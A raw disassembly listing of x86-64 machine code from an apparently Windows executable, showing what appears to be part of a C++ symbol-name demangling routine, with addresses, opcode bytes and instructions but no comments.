   140004bab:	e9 30 ff ff ff       	jmp    0x140004ae0
   140004bb0:	8b 43 38             	mov    0x38(%rbx),%eax
   140004bb3:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   140004bb6:	7d 28                	jge    0x140004be0
   140004bb8:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   140004bbc:	4c 63 c0             	movslq %eax,%r8
   140004bbf:	83 c0 01             	add    $0x1,%eax
   140004bc2:	4a 89 34 c2          	mov    %rsi,(%rdx,%r8,8)
   140004bc6:	89 43 38             	mov    %eax,0x38(%rbx)
   140004bc9:	e9 30 ff ff ff       	jmp    0x140004afe
   140004bce:	66 90                	xchg   %ax,%ax
   140004bd0:	48 85 f6             	test   %rsi,%rsi
   140004bd3:	0f 85 36 ff ff ff    	jne    0x140004b0f
   140004bd9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004be0:	31 f6                	xor    %esi,%esi
   140004be2:	48 89 f0             	mov    %rsi,%rax
   140004be5:	48 83 c4 20          	add    $0x20,%rsp
   140004be9:	5b                   	pop    %rbx
   140004bea:	5e                   	pop    %rsi
   140004beb:	5f                   	pop    %rdi
   140004bec:	c3                   	ret
   140004bed:	0f 1f 00             	nopl   (%rax)
   140004bf0:	45 31 c0             	xor    %r8d,%r8d
   140004bf3:	48 89 f2             	mov    %rsi,%rdx
   140004bf6:	48 89 d9             	mov    %rbx,%rcx
   140004bf9:	e8 22 eb ff ff       	call   0x140003720
   140004bfe:	48 89 c6             	mov    %rax,%rsi
   140004c01:	e9 da fe ff ff       	jmp    0x140004ae0
   140004c06:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140004c0d:	00 00 00 
   140004c10:	48 83 c1 01          	add    $0x1,%rcx
   140004c14:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   140004c18:	e9 91 fe ff ff       	jmp    0x140004aae
   140004c1d:	0f 1f 00             	nopl   (%rax)
   140004c20:	57                   	push   %rdi
   140004c21:	56                   	push   %rsi
   140004c22:	53                   	push   %rbx
   140004c23:	48 83 ec 40          	sub    $0x40,%rsp
   140004c27:	89 d6                	mov    %edx,%esi
   140004c29:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140004c2d:	48 89 cb             	mov    %rcx,%rbx
   140004c30:	0f b6 02             	movzbl (%rdx),%eax
   140004c33:	3c 55                	cmp    $0x55,%al
   140004c35:	0f 84 95 01 00 00    	je     0x140004dd0
   140004c3b:	7f 6b                	jg     0x140004ca8
   140004c3d:	3c 4e                	cmp    $0x4e,%al
   140004c3f:	0f 84 9b 01 00 00    	je     0x140004de0
   140004c45:	3c 53                	cmp    $0x53,%al
   140004c47:	0f 85 0b 01 00 00    	jne    0x140004d58
   140004c4d:	45 31 c9             	xor    %r9d,%r9d
   140004c50:	80 7a 01 74          	cmpb   $0x74,0x1(%rdx)
   140004c54:	0f 84 76 02 00 00    	je     0x140004ed0
   140004c5a:	31 d2                	xor    %edx,%edx
   140004c5c:	48 89 d9             	mov    %rbx,%rcx
   140004c5f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004c64:	e8 a7 d6 ff ff       	call   0x140002310
   140004c69:	49 89 c0             	mov    %rax,%r8
   140004c6c:	48 85 c0             	test   %rax,%rax
   140004c6f:	0f 84 44 01 00 00    	je     0x140004db9
   140004c75:	8b 00                	mov    (%rax),%eax
   140004c77:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   140004c7c:	83 e8 55             	sub    $0x55,%eax
   140004c7f:	83 f8 01             	cmp    $0x1,%eax
   140004c82:	0f 86 d6 00 00 00    	jbe    0x140004d5e
   140004c88:	4d 85 c9             	test   %r9,%r9
   140004c8b:	0f 85 28 01 00 00    	jne    0x140004db9
   140004c91:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140004c95:	80 3a 49             	cmpb   $0x49,(%rdx)
   140004c98:	0f 85 f9 00 00 00    	jne    0x140004d97
   140004c9e:	e9 eb 01 00 00       	jmp    0x140004e8e
   140004ca3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004ca8:	3c 5a                	cmp    $0x5a,%al
   140004caa:	0f 85 a8 00 00 00    	jne    0x140004d58
   140004cb0:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140004cb4:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140004cb8:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140004cbc:	3c 47                	cmp    $0x47,%al
   140004cbe:	0f 84 fc 01 00 00    	je     0x140004ec0
   140004cc4:	3c 54                	cmp    $0x54,%al
   140004cc6:	0f 84 f4 01 00 00    	je     0x140004ec0
   140004ccc:	31 d2                	xor    %edx,%edx
   140004cce:	e8 2d 04 00 00       	call   0x140005100
   140004cd3:	49 89 c0             	mov    %rax,%r8
   140004cd6:	4d 85 c0             	test   %r8,%r8
   140004cd9:	0f 84 da 00 00 00    	je     0x140004db9
   140004cdf:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004ce3:	80 38 45             	cmpb   $0x45,(%rax)
   140004ce6:	0f 85 cd 00 00 00    	jne    0x140004db9
   140004cec:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004cf0:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140004cf4:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   140004cf8:	80 fa 73             	cmp    $0x73,%dl
   140004cfb:	0f 84 37 03 00 00    	je     0x140005038
   140004d01:	80 fa 64             	cmp    $0x64,%dl
   140004d04:	0f 84 26 02 00 00    	je     0x140004f30
   140004d0a:	31 d2                	xor    %edx,%edx
   140004d0c:	48 89 d9             	mov    %rbx,%rcx
   140004d0f:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   140004d14:	e8 07 ff ff ff       	call   0x140004c20
   140004d19:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   140004d1e:	48 85 c0             	test   %rax,%rax
   140004d21:	49 89 c1             	mov    %rax,%r9
   140004d24:	0f 84 76 03 00 00    	je     0x1400050a0
   140004d2a:	8b 00                	mov    (%rax),%eax
   140004d2c:	83 e0 fd             	and    $0xfffffffd,%eax
   140004d2f:	83 f8 48             	cmp    $0x48,%eax
   140004d32:	0f 85 70 03 00 00    	jne    0x1400050a8
   140004d38:	41 83 38 03          	cmpl   $0x3,(%r8)
   140004d3c:	0f 84 d6 02 00 00    	je     0x140005018
   140004d42:	ba 02 00 00 00       	mov    $0x2,%edx
   140004d47:	48 89 d9             	mov    %rbx,%rcx
   140004d4a:	e8 f1 c7 ff ff       	call   0x140001540
   140004d4f:	49 89 c0             	mov    %rax,%r8
   140004d52:	eb 21                	jmp    0x140004d75
   140004d54:	0f 1f 40 00          	nopl   0x0(%rax)
   140004d58:	45 31 c0             	xor    %r8d,%r8d
   140004d5b:	45 31 c9             	xor    %r9d,%r9d
   140004d5e:	4c 89 ca             	mov    %r9,%rdx
   140004d61:	48 89 d9             	mov    %rbx,%rcx
   140004d64:	e8 b7 e9 ff ff       	call   0x140003720
   140004d69:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140004d6d:	49 89 c0             	mov    %rax,%r8
   140004d70:	80 3a 49             	cmpb   $0x49,(%rdx)
   140004d73:	74 33                	je     0x140004da8
   140004d75:	85 f6                	test   %esi,%esi
   140004d77:	74 1e                	je     0x140004d97
   140004d79:	4d 85 c0             	test   %r8,%r8
   140004d7c:	74 3b                	je     0x140004db9
   140004d7e:	8b 43 38             	mov    0x38(%rbx),%eax
   140004d81:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   140004d84:	7d 33                	jge    0x140004db9
   140004d86:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   140004d8a:	48 63 c8             	movslq %eax,%rcx
   140004d8d:	83 c0 01             	add    $0x1,%eax
   140004d90:	4c 89 04 ca          	mov    %r8,(%rdx,%rcx,8)
   140004d94:	89 43 38             	mov    %eax,0x38(%rbx)
   140004d97:	4c 89 c0             	mov    %r8,%rax
   140004d9a:	48 83 c4 40          	add    $0x40,%rsp
   140004d9e:	5b                   	pop    %rbx
   140004d9f:	5e                   	pop    %rsi
   140004da0:	5f                   	pop    %rdi
   140004da1:	c3                   	ret
   140004da2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004da8:	48 85 c0             	test   %rax,%rax
   140004dab:	74 0c                	je     0x140004db9
   140004dad:	8b 43 38             	mov    0x38(%rbx),%eax
   140004db0:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   140004db3:	0f 8c b7 00 00 00    	jl     0x140004e70
   140004db9:	45 31 c0             	xor    %r8d,%r8d
   140004dbc:	4c 89 c0             	mov    %r8,%rax
   140004dbf:	48 83 c4 40          	add    $0x40,%rsp
   140004dc3:	5b                   	pop    %rbx
   140004dc4:	5e                   	pop    %rsi
   140004dc5:	5f                   	pop    %rdi
   140004dc6:	c3                   	ret
   140004dc7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004dce:	00 00 
   140004dd0:	45 31 c0             	xor    %r8d,%r8d
   140004dd3:	31 d2                	xor    %edx,%edx
   140004dd5:	e8 46 e9 ff ff       	call   0x140003720
   140004dda:	49 89 c0             	mov    %rax,%r8
   140004ddd:	eb 96                	jmp    0x140004d75
   140004ddf:	90                   	nop
   140004de0:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140004de4:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140004de8:	80 7a 01 48          	cmpb   $0x48,0x1(%rdx)
   140004dec:	0f 84 f6 01 00 00    	je     0x140004fe8
   140004df2:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140004df7:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004dfd:	e8 4e f9 ff ff       	call   0x140004750
   140004e02:	48 89 c7             	mov    %rax,%rdi
   140004e05:	48 85 c0             	test   %rax,%rax
   140004e08:	74 af                	je     0x140004db9
   140004e0a:	31 d2                	xor    %edx,%edx
   140004e0c:	48 89 d9             	mov    %rbx,%rcx
   140004e0f:	e8 ec c9 ff ff       	call   0x140001800
   140004e14:	49 89 c0             	mov    %rax,%r8
   140004e17:	ba 01 00 00 00       	mov    $0x1,%edx
   140004e1c:	48 89 d9             	mov    %rbx,%rcx
   140004e1f:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   140004e24:	e8 77 fc ff ff       	call   0x140004aa0
   140004e29:	48 89 07             	mov    %rax,(%rdi)
   140004e2c:	48 85 c0             	test   %rax,%rax
   140004e2f:	74 88                	je     0x140004db9
   140004e31:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   140004e36:	4d 85 c0             	test   %r8,%r8
   140004e39:	74 0e                	je     0x140004e49
   140004e3b:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140004e40:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   140004e45:	49 89 40 10          	mov    %rax,0x10(%r8)
   140004e49:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004e4d:	80 38 45             	cmpb   $0x45,(%rax)
   140004e50:	0f 85 63 ff ff ff    	jne    0x140004db9
   140004e56:	48 83 c0 01          	add    $0x1,%rax
   140004e5a:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   140004e5f:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140004e63:	e9 0d ff ff ff       	jmp    0x140004d75
   140004e68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140004e6f:	00 
   140004e70:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140004e74:	4c 63 c8             	movslq %eax,%r9
   140004e77:	83 c0 01             	add    $0x1,%eax
   140004e7a:	4e 89 04 c9          	mov    %r8,(%rcx,%r9,8)
   140004e7e:	45 31 c9             	xor    %r9d,%r9d
   140004e81:	89 43 38             	mov    %eax,0x38(%rbx)
   140004e84:	0f b6 02             	movzbl (%rdx),%eax
   140004e87:	83 e8 49             	sub    $0x49,%eax
   140004e8a:	3c 01                	cmp    $0x1,%al
   140004e8c:	77 1d                	ja     0x140004eab
   140004e8e:	48 83 c2 01          	add    $0x1,%rdx
   140004e92:	48 89 d9             	mov    %rbx,%rcx
   140004e95:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   140004e9a:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140004e9e:	e8 dd fa ff ff       	call   0x140004980
   140004ea3:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   140004ea8:	49 89 c1             	mov    %rax,%r9
   140004eab:	ba 04 00 00 00       	mov    $0x4,%edx
   140004eb0:	48 89 d9             	mov    %rbx,%rcx
   140004eb3:	e8 88 c6 ff ff       	call   0x140001540
   140004eb8:	49 89 c0             	mov    %rax,%r8
   140004ebb:	e9 b5 fe ff ff       	jmp    0x140004d75
   140004ec0:	48 89 d9             	mov    %rbx,%rcx
   140004ec3:	e8 48 04 00 00       	call   0x140005310
   140004ec8:	49 89 c0             	mov    %rax,%r8
   140004ecb:	e9 06 fe ff ff       	jmp    0x140004cd6
   140004ed0:	48 8d 42 02          	lea    0x2(%rdx),%rax
   140004ed4:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140004ed8:	8b 41 28             	mov    0x28(%rcx),%eax
   140004edb:	3b 41 2c             	cmp    0x2c(%rcx),%eax
   140004ede:	7d 33                	jge    0x140004f13
   140004ee0:	4c 63 c8             	movslq %eax,%r9
   140004ee3:	83 c0 01             	add    $0x1,%eax
   140004ee6:	89 41 28             	mov    %eax,0x28(%rcx)
   140004ee9:	49 c1 e1 05          	shl    $0x5,%r9
   140004eed:	48 8d 05 1b 06 02 00 	lea    0x2061b(%rip),%rax        # 0x14002550f
   140004ef4:	4c 03 49 20          	add    0x20(%rcx),%r9
   140004ef8:	49 c7 41 04 00 00 00 	movq   $0x0,0x4(%r9)
   140004eff:	00 
   140004f00:	41 c7 01 00 00 00 00 	movl   $0x0,(%r9)
   140004f07:	49 89 41 10          	mov    %rax,0x10(%r9)
   140004f0b:	41 c7 41 18 03 00 00 	movl   $0x3,0x18(%r9)
   140004f12:	00 
   140004f13:	83 43 48 03          	addl   $0x3,0x48(%rbx)
   140004f17:	80 7a 02 53          	cmpb   $0x53,0x2(%rdx)
   140004f1b:	0f 84 39 fd ff ff    	je     0x140004c5a
   140004f21:	45 31 c0             	xor    %r8d,%r8d
   140004f24:	e9 35 fe ff ff       	jmp    0x140004d5e
   140004f29:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004f30:	48 8d 50 02          	lea    0x2(%rax),%rdx
   140004f34:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140004f38:	0f b6 40 02          	movzbl 0x2(%rax),%eax
   140004f3c:	3c 5f                	cmp    $0x5f,%al
   140004f3e:	0f 84 8d 01 00 00    	je     0x1400050d1
   140004f44:	3c 6e                	cmp    $0x6e,%al
   140004f46:	0f 84 6d fe ff ff    	je     0x140004db9
   140004f4c:	48 89 d9             	mov    %rbx,%rcx
   140004f4f:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   140004f54:	e8 47 c7 ff ff       	call   0x1400016a0
   140004f59:	83 c0 01             	add    $0x1,%eax
   140004f5c:	89 c7                	mov    %eax,%edi
   140004f5e:	0f 88 55 fe ff ff    	js     0x140004db9
   140004f64:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140004f68:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   140004f6d:	80 3a 5f             	cmpb   $0x5f,(%rdx)
   140004f70:	0f 85 43 fe ff ff    	jne    0x140004db9
   140004f76:	48 83 c2 01          	add    $0x1,%rdx
   140004f7a:	48 89 d9             	mov    %rbx,%rcx
   140004f7d:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   140004f82:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140004f86:	31 d2                	xor    %edx,%edx
   140004f88:	e8 93 fc ff ff       	call   0x140004c20
   140004f8d:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   140004f92:	48 85 c0             	test   %rax,%rax
   140004f95:	49 89 c2             	mov    %rax,%r10
   140004f98:	74 0e                	je     0x140004fa8
   140004f9a:	8b 00                	mov    (%rax),%eax
   140004f9c:	83 e0 fd             	and    $0xfffffffd,%eax
   140004f9f:	83 f8 48             	cmp    $0x48,%eax
   140004fa2:	0f 85 30 01 00 00    	jne    0x1400050d8
   140004fa8:	8b 43 28             	mov    0x28(%rbx),%eax
   140004fab:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140004fae:	0f 8d ec 00 00 00    	jge    0x1400050a0
   140004fb4:	4c 63 c8             	movslq %eax,%r9
   140004fb7:	83 c0 01             	add    $0x1,%eax
   140004fba:	49 c1 e1 05          	shl    $0x5,%r9
   140004fbe:	4c 03 4b 20          	add    0x20(%rbx),%r9
   140004fc2:	49 c7 41 04 00 00 00 	movq   $0x0,0x4(%r9)
   140004fc9:	00 
   140004fca:	89 43 28             	mov    %eax,0x28(%rbx)
   140004fcd:	41 c7 01 49 00 00 00 	movl   $0x49,(%r9)
   140004fd4:	41 89 79 18          	mov    %edi,0x18(%r9)
   140004fd8:	4d 89 51 10          	mov    %r10,0x10(%r9)
   140004fdc:	e9 57 fd ff ff       	jmp    0x140004d38
   140004fe1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004fe8:	48 83 c2 02          	add    $0x2,%rdx
   140004fec:	83 41 48 05          	addl   $0x5,0x48(%rcx)
   140004ff0:	45 31 c0             	xor    %r8d,%r8d
   140004ff3:	45 31 c9             	xor    %r9d,%r9d
   140004ff6:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140004ffa:	ba 21 00 00 00       	mov    $0x21,%edx
   140004fff:	48 8d 7c 24 38       	lea    0x38(%rsp),%rdi
   140005004:	e8 37 c5 ff ff       	call   0x140001540
   140005009:	49 89 c0             	mov    %rax,%r8
   14000500c:	e9 06 fe ff ff       	jmp    0x140004e17
   140005011:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140005018:	49 8b 40 18          	mov    0x18(%r8),%rax
   14000501c:	83 38 2a             	cmpl   $0x2a,(%rax)
   14000501f:	0f 85 1d fd ff ff    	jne    0x140004d42
   140005025:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
   14000502c:	00 
   14000502d:	e9 10 fd ff ff       	jmp    0x140004d42
   140005032:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005038:	48 83 c0 02          	add    $0x2,%rax
   14000503c:	48 89 d9             	mov    %rbx,%rcx
   14000503f:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   140005044:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140005048:	e8 13 c8 ff ff       	call   0x140001860
   14000504d:	85 c0                	test   %eax,%eax
   14000504f:	0f 84 64 fd ff ff    	je     0x140004db9
   140005055:	8b 43 28             	mov    0x28(%rbx),%eax
   140005058:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   14000505b:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   140005060:	7d 3e                	jge    0x1400050a0
   140005062:	4c 63 c8             	movslq %eax,%r9
   140005065:	83 c0 01             	add    $0x1,%eax
   140005068:	89 43 28             	mov    %eax,0x28(%rbx)
   14000506b:	49 c1 e1 05          	shl    $0x5,%r9
   14000506f:	48 8d 05 8a 04 02 00 	lea    0x2048a(%rip),%rax        # 0x140025500
   140005076:	4c 03 4b 20          	add    0x20(%rbx),%r9
   14000507a:	49 c7 41 04 00 00 00 	movq   $0x0,0x4(%r9)
   140005081:	00 
   140005082:	41 c7 01 00 00 00 00 	movl   $0x0,(%r9)
   140005089:	49 89 41 10          	mov    %rax,0x10(%r9)
   14000508d:	41 c7 41 18 0e 00 00 	movl   $0xe,0x18(%r9)
   140005094:	00 
   140005095:	e9 9e fc ff ff       	jmp    0x140004d38
   14000509a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400050a0:	45 31 c9             	xor    %r9d,%r9d
   1400050a3:	e9 90 fc ff ff       	jmp    0x140004d38
   1400050a8:	48 89 d9             	mov    %rbx,%rcx
   1400050ab:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   1400050b0:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400050b5:	e8 a6 c7 ff ff       	call   0x140001860
   1400050ba:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   1400050bf:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   1400050c4:	85 c0                	test   %eax,%eax
   1400050c6:	0f 84 ed fc ff ff    	je     0x140004db9
   1400050cc:	e9 67 fc ff ff       	jmp    0x140004d38
   1400050d1:	31 ff                	xor    %edi,%edi
   1400050d3:	e9 9e fe ff ff       	jmp    0x140004f76
   1400050d8:	48 89 d9             	mov    %rbx,%rcx
   1400050db:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   1400050e0:	e8 7b c7 ff ff       	call   0x140001860
   1400050e5:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   1400050ea:	85 c0                	test   %eax,%eax
   1400050ec:	0f 85 b6 fe ff ff    	jne    0x140004fa8
   1400050f2:	e9 c2 fc ff ff       	jmp    0x140004db9
   1400050f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400050fe:	00 00 
   140005100:	56                   	push   %rsi
   140005101:	53                   	push   %rbx
   140005102:	48 83 ec 38          	sub    $0x38,%rsp
   140005106:	89 d6                	mov    %edx,%esi
   140005108:	31 d2                	xor    %edx,%edx
   14000510a:	48 89 cb             	mov    %rcx,%rbx
   14000510d:	e8 0e fb ff ff       	call   0x140004c20
   140005112:	49 89 c2             	mov    %rax,%r10
   140005115:	48 85 c0             	test   %rax,%rax
   140005118:	74 76                	je     0x140005190
   14000511a:	85 f6                	test   %esi,%esi
   14000511c:	0f 84 7e 00 00 00    	je     0x1400051a0
   140005122:	f6 43 10 01          	testb  $0x1,0x10(%rbx)
   140005126:	75 78                	jne    0x1400051a0
   140005128:	48 b9 3f 00 00 00 00 	movabs $0xc800000000003f,%rcx
   14000512f:	00 c8 00 
   140005132:	41 8b 12             	mov    (%r10),%edx
   140005135:	8d 42 e4             	lea    -0x1c(%rdx),%eax
   140005138:	83 f8 37             	cmp    $0x37,%eax
   14000513b:	77 15                	ja     0x140005152
   14000513d:	48 0f a3 c1          	bt     %rax,%rcx
   140005141:	73 50                	jae    0x140005193
   140005143:	4d 8b 52 10          	mov    0x10(%r10),%r10
   140005147:	41 8b 12             	mov    (%r10),%edx
   14000514a:	8d 42 e4             	lea    -0x1c(%rdx),%eax
   14000514d:	83 f8 37             	cmp    $0x37,%eax
   140005150:	76 eb                	jbe    0x14000513d
   140005152:	83 fa 02             	cmp    $0x2,%edx
   140005155:	75 3c                	jne    0x140005193
   140005157:	49 8b 52 18          	mov    0x18(%r10),%rdx
   14000515b:	48 85 d2             	test   %rdx,%rdx
   14000515e:	74 30                	je     0x140005190
   140005160:	48 b9 3f 00 00 00 00 	movabs $0xc800000000003f,%rcx
   140005167:	00 c8 00 
   14000516a:	8b 02                	mov    (%rdx),%eax
   14000516c:	83 e8 1c             	sub    $0x1c,%eax
   14000516f:	83 f8 37             	cmp    $0x37,%eax
   140005172:	77 1f                	ja     0x140005193
   140005174:	48 0f a3 c1          	bt     %rax,%rcx
   140005178:	73 19                	jae    0x140005193
   14000517a:	48 8b 52 10          	mov    0x10(%rdx),%rdx
   14000517e:	49 89 52 18          	mov    %rdx,0x18(%r10)
   140005182:	48 85 d2             	test   %rdx,%rdx
   140005185:	75 e3                	jne    0x14000516a
   140005187:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000518e:	00 00 
   140005190:	45 31 d2             	xor    %r10d,%r10d
   140005193:	4c 89 d0             	mov    %r10,%rax
   140005196:	48 83 c4 38          	add    $0x38,%rsp
   14000519a:	5b                   	pop    %rbx
   14000519b:	5e                   	pop    %rsi
   14000519c:	c3                   	ret
   14000519d:	0f 1f 00             	nopl   (%rax)
   1400051a0:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400051a4:	0f b6 00             	movzbl (%rax),%eax
   1400051a7:	84 c0                	test   %al,%al
   1400051a9:	74 e8                	je     0x140005193
   1400051ab:	3c 45                	cmp    $0x45,%al
   1400051ad:	74 e4                	je     0x140005193
   1400051af:	4c 89 d2             	mov    %r10,%rdx
   1400051b2:	8b 02                	mov    (%rdx),%eax
   1400051b4:	83 f8 04             	cmp    $0x4,%eax
   1400051b7:	0f 84 83 00 00 00    	je     0x140005240
   1400051bd:	76 71                	jbe    0x140005230
   1400051bf:	83 e8 1c             	sub    $0x1c,%eax
   1400051c2:	83 f8 37             	cmp    $0x37,%eax
   1400051c5:	77 19                	ja     0x1400051e0
   1400051c7:	48 b9 3f 00 00 00 00 	movabs $0xc800000000003f,%rcx
   1400051ce:	00 c8 00 
   1400051d1:	48 0f a3 c1          	bt     %rax,%rcx
   1400051d5:	73 09                	jae    0x1400051e0
   1400051d7:	48 8b 52 10          	mov    0x10(%rdx),%rdx
   1400051db:	48 85 d2             	test   %rdx,%rdx
   1400051de:	75 d2                	jne    0x1400051b2
   1400051e0:	31 d2                	xor    %edx,%edx
   1400051e2:	48 89 d9             	mov    %rbx,%rcx
   1400051e5:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   1400051ea:	e8 81 e0 ff ff       	call   0x140003270
   1400051ef:	49 89 c0             	mov    %rax,%r8
   1400051f2:	48 85 c0             	test   %rax,%rax
   1400051f5:	74 99                	je     0x140005190
   1400051f7:	85 f6                	test   %esi,%esi
   1400051f9:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   1400051fe:	75 0a                	jne    0x14000520a
   140005200:	41 83 3a 02          	cmpl   $0x2,(%r10)
   140005204:	0f 84 de 00 00 00    	je     0x1400052e8
   14000520a:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000520e:	80 38 51             	cmpb   $0x51,(%rax)
   140005211:	74 7d                	je     0x140005290
   140005213:	4d 89 c1             	mov    %r8,%r9
   140005216:	ba 03 00 00 00       	mov    $0x3,%edx
   14000521b:	4d 89 d0             	mov    %r10,%r8
   14000521e:	48 89 d9             	mov    %rbx,%rcx
   140005221:	48 83 c4 38          	add    $0x38,%rsp
   140005225:	5b                   	pop    %rbx
   140005226:	5e                   	pop    %rsi
   140005227:	e9 14 c3 ff ff       	jmp    0x140001540
   14000522c:	0f 1f 40 00          	nopl   0x0(%rax)
   140005230:	83 f8 02             	cmp    $0x2,%eax
   140005233:	75 ab                	jne    0x1400051e0
   140005235:	48 8b 52 18          	mov    0x18(%rdx),%rdx
   140005239:	eb a0                	jmp    0x1400051db
   14000523b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005240:	48 8b 52 10          	mov    0x10(%rdx),%rdx
   140005244:	48 85 d2             	test   %rdx,%rdx
   140005247:	74 27                	je     0x140005270
   140005249:	8b 02                	mov    (%rdx),%eax
   14000524b:	83 f8 08             	cmp    $0x8,%eax
   14000524e:	77 30                	ja     0x140005280
   140005250:	83 f8 06             	cmp    $0x6,%eax
   140005253:	77 8b                	ja     0x1400051e0
   140005255:	83 e8 01             	sub    $0x1,%eax
   140005258:	83 f8 01             	cmp    $0x1,%eax
   14000525b:	77 13                	ja     0x140005270
   14000525d:	48 8b 52 18          	mov    0x18(%rdx),%rdx
   140005261:	48 85 d2             	test   %rdx,%rdx
   140005264:	75 e3                	jne    0x140005249
   140005266:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000526d:	00 00 00 
   140005270:	ba 01 00 00 00       	mov    $0x1,%edx
   140005275:	e9 68 ff ff ff       	jmp    0x1400051e2
   14000527a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005280:	31 d2                	xor    %edx,%edx
   140005282:	83 f8 36             	cmp    $0x36,%eax
   140005285:	0f 95 c2             	setne  %dl
   140005288:	e9 55 ff ff ff       	jmp    0x1400051e2
   14000528d:	0f 1f 00             	nopl   (%rax)
   140005290:	48 83 c0 01          	add    $0x1,%rax
   140005294:	8b 73 4c             	mov    0x4c(%rbx),%esi
   140005297:	48 89 d9             	mov    %rbx,%rcx
   14000529a:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   14000529f:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400052a3:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   1400052aa:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   1400052af:	e8 cc ea ff ff       	call   0x140003d80
   1400052b4:	89 73 4c             	mov    %esi,0x4c(%rbx)
   1400052b7:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   1400052bc:	48 85 c0             	test   %rax,%rax
   1400052bf:	49 89 c1             	mov    %rax,%r9
   1400052c2:	74 3a                	je     0x1400052fe
   1400052c4:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   1400052c9:	ba 5e 00 00 00       	mov    $0x5e,%edx
   1400052ce:	48 89 d9             	mov    %rbx,%rcx
   1400052d1:	e8 6a c2 ff ff       	call   0x140001540
   1400052d6:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   1400052db:	49 89 c0             	mov    %rax,%r8
   1400052de:	e9 30 ff ff ff       	jmp    0x140005213
   1400052e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400052e8:	83 38 2a             	cmpl   $0x2a,(%rax)
   1400052eb:	0f 85 19 ff ff ff    	jne    0x14000520a
   1400052f1:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
   1400052f8:	00 
   1400052f9:	e9 0c ff ff ff       	jmp    0x14000520a
   1400052fe:	45 31 c0             	xor    %r8d,%r8d
